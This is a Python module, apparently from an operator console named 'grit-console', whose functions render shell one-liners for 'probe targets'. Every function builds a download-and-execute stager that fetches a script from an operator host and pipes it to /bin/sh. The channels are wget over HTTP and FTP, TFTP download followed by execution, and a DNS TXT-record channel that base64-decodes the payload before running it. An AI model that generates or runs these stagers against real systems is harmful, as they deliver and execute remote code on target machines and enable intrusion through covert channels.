"""Probe target command rendering helpers for grit-console."""

from .bridge_routes import target_route_context
from .operator_network import operator_advertised_host
from .shell_utils import shquote


def probe_route_context(cfg, host=None, port=None):
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = port or cfg.get("GRIT_PROBE_PORT", 22207)
    return target_route_context(cfg, "probe", direct_host=direct_host, direct_port=direct_port)


def render_probe_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    route = probe_route_context(cfg, host=host, port=port)
    url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_tftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    safe_local_name = script_name.replace("'", "").replace("/", "_") or "probe.sh"
    local_path = f"/tmp/{safe_local_name}"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
    return f"tftp -g -r {shquote(script_name)} -l {shquote(local_path)} {shquote(direct_host)} {shquote(str(direct_port))} && /bin/sh {shquote(local_path)}"


def render_probe_ftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_FTP_PORT", 22209))
    url = f"ftp://{direct_host}:{direct_port}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_dns_command(cfg, host=None, port=None):
    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_DNS_PORT", 22210))
    if direct_port == 53:
        return f"nslookup -type=TXT {shquote(dns_name)} {shquote(direct_host)} | sed -n 's/.*\"\\(.*\\)\".*/\\1/p' | tr -d '\\n' | base64 -d | /bin/sh"
    return f"dig @{shquote(direct_host)} -p {shquote(str(direct_port))} +short TXT {shquote(dns_name)} | tr -d '\" \\n' | base64 -d | /bin/sh"
